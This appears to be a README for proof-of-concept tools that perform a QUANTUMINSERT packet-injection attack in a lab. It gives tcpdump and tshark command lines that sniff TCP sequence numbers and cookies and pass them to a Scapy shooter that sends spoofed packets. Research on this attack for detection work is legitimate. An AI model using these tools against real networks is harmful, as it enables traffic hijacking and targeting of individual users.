QI Tools
=========

Proof of concept tools to perform a `QUANTUMINSERT`. Our Lab setup consisted of the following VMs:

 * qi-shooter (VM that will run shooter.py)
 * qi-router (VM that will run monitor.py)
 * qi-target (VM that will be attacked)
 
Pcaps created with the help of these tools can be found here:

 * [https://github.com/fox-it/quantuminsert/tree/master/pcaps](https://github.com/fox-it/quantuminsert/tree/master/pcaps)

monitor.py
----------

This script is intended to leak the TCP sequence and ACK numbers to the `shooter.py`. It has a dependency on `tcpdump` or `tshark` as it receives the sequence and ack numbers from the output of these programs.
It's possible to implement packet capture in `monitor.py` itself, making it probably even faster to leak the required information.

The information is sent to the shooter using a single UDP packet. However, one could use other ways to do this.

#### Example usage for tcpdump

	stdbuf --output=0 |	tcpdump -nn -i eth0 "host jsonip.com and tcp[tcpflags]=(tcp-syn|tcp-ack)" | python monitor.py -s 10.0.0.2 -p 12345
	
`stdbuf` is needed as `tcpdump` will buffer it's output by default. The bpf filter ensures that we only see the SYN+ACK of `jsonip.com`, which will be printed to stdout and parsed by `monitor.py`. The shooter is then notified at `10.0.0.2` running on port `12345`.

#### Example usage for tshark

By using `tshark` one could specifically target a client, for example by identifying a client by it's unique Cookie headers.

Example command:

	stdbuf --output=0 tshark -ni eth0 -Tfields \
		-e tcp.seq -e tcp.ack \
		-e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport \
		-e tcp.analysis.bytes_in_flight -e http.host -e 'http.cookie' \
		-o tcp.relative_sequence_numbers:0 -R http.request \
		'host jsonip.com and port 80' | python monitor.py -s 10.0.0.2 -p 12345 --tshark
		
This command will output the required fields when someone makes a HTTP request to `jsonip.com`. The outputted cookie and host fields could be used as selectors in the monitor script.

The `-o tcp.relative_sequence_numbers:0` option is needed to output non relative sequence numbers.

shooter.py
----------
This script is responsible for receiving the sequence+ack data from `monitor.py` using UDP. It has a dependency on `Scapy` for crafting and sending the spoofed packet.

Example usage:

	python shooter.py -l 10.0.0.2 -p 12345
	
This will make the shooter script listen on `10.0.0.2` and on port `12345`.

